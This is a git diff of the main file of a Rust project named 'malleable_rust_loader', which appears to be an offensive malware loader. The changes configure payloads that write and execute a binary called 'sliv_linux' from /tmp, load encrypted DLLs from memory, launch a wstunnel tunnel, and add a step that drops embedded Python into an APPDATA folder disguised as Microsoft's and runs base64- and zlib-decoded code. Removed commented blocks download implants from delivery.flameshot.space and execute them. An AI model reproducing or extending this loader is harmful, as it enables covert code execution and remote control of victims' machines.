@@ -16,6 +16,7 @@ use malleable_rust_loader::payload::Exec;
 use malleable_rust_loader::payload::ExecPython;
 use malleable_rust_loader::payload::Payload;
 use malleable_rust_loader::payload::WriteFile;
+use malleable_rust_loader::payload::WriteZip;
 //use malleable_rust_loader::poollink::Advanced;
 use malleable_rust_loader::poollink::PoolLinks;
 //use malleable_rust_loader::poollink::PoolMode;
@@ -82,45 +83,15 @@ fn main() {
                     sleep: 0,
                 }),
                 path: "/tmp/sliv_linux".to_string(),
-                hash: "".to_string() 
+                hash: "".to_string(),
             }),
             Payload::Exec(Exec {
                 path: "/tmp/sliv_linux".to_string(),
-                cmdline:"".to_string(),
-                thread:true
+                cmdline: "".to_string(),
+                thread: true,
             }),
         ];
-        /*
-        payload_choice = vec![Payload::DownloadAndExec(DownloadAndExec {
-            link: Link::HTTP(HTTPLink {
-                url: String::from("https://delivery.flameshot.space/nologin/sliv_linux"),
-                dataoperation: vec![],
-                jitt: 0,
-                sleep: 0,
-            }),
-            out_filepath: String::from("/tmp/sliv_linux"),
-            out_overwrite: false,
-            exec_cmdline: String::from(""),
-        })];
-        */
-    } else if payload == "windlexec".to_string() {
-        info!("[+] Loader type choice: DownloadAndExec windows");
-        todo!();
-        /*
-        payload_choice = vec![Payload::DownloadAndExec(DownloadAndExec {
-            link: Link::HTTP(HTTPLink {
-                url: String::from("https://delivery.flameshot.space/nologin/exe_slivperso.exe"),
-                dataoperation: vec![],
-                jitt: 0,
-                sleep: 0,
-            }),
-            out_filepath: String::from("C:\\Users\\user\\AppData\\Roaming\\exe_slivperso.exe"),
-            //TODO ce serait cool
-            //out_filepath: String::from("%appdata%\\exe_slivperso.exe"),
-            out_overwrite: false,
-            exec_cmdline: String::from(""),
-        })];
-        */
+
     } else if payload == "dll".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AEAD]");
         let payload_dataoperation: Vec<DataOperation> =
@@ -135,19 +106,23 @@ fn main() {
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
         })];
+
     } else if payload == "py".to_string() {
         info!("[+] Loader type choice: ExecPython");
-        payload_choice = vec![Payload::ExecPython( 
-            ExecPython{
-                    link: Link::HTTP(HTTPLink{
-                        url:String::from("https://www.python.org/ftp/python/3.10.10/python-3.10.10-embed-amd64.zip"),
-                        dataoperation: vec![
-                        ],        
-                        jitt:0,
-                        sleep:0
-                    }),
-                    out_filepath:String::from("C:\\Temp\\python-3.10.10-embed-amd64\\"),
-                    out_overwrite:false,
+        payload_choice = vec![
+            Payload::WriteZip(WriteZip{
+                link: Link::HTTP(HTTPLink{
+                    url:String::from("https://www.python.org/ftp/python/3.10.10/python-3.10.10-embed-amd64.zip"),
+                    dataoperation: vec![],        
+                    jitt:0,
+                    sleep:0
+                }),
+                path: "${APPDATA}\\Microsoft\\python\\python-3.10.10-embed-amd64\\".to_string(),
+        }),
+
+            Payload::ExecPython( 
+                ExecPython{
+                    path: "${APPDATA}\\Microsoft\\python\\python-3.10.10-embed-amd64\\".to_string(),
                     python_code:String::from("
 import base64
 import zlib
@@ -159,6 +134,7 @@ exec(decoded_script)
 
             }
         )];
+
     } else if payload == "file".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AEAD] from file");
         let payload_dataoperation: Vec<DataOperation> =
@@ -173,6 +149,7 @@ exec(decoded_script)
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
         })];
+
     } else if payload == "memdll".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AEAD]");
         let payload_dataoperation: Vec<DataOperation> =
@@ -187,6 +164,7 @@ exec(decoded_script)
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
         })];
+        
     } else if payload == "wstunnel".to_string() {
         // cp ~/wstunnel/target/x86_64-pc-windows-gnu/release/wstunnel.exe  ~/.malleable/payload/
         // cargo run --bin encrypt_payload ~/.malleable/payload/wstunnel.exe
@@ -230,8 +208,7 @@ exec(decoded_script)
             cmdline:String::from(""),
             thread:false
         }),
-*/
-
+        */
         Payload::DllFromMemory(DllFromMemory {
             link: Link::MEMORY(MemoryLink {
                 memory_nb: 2,
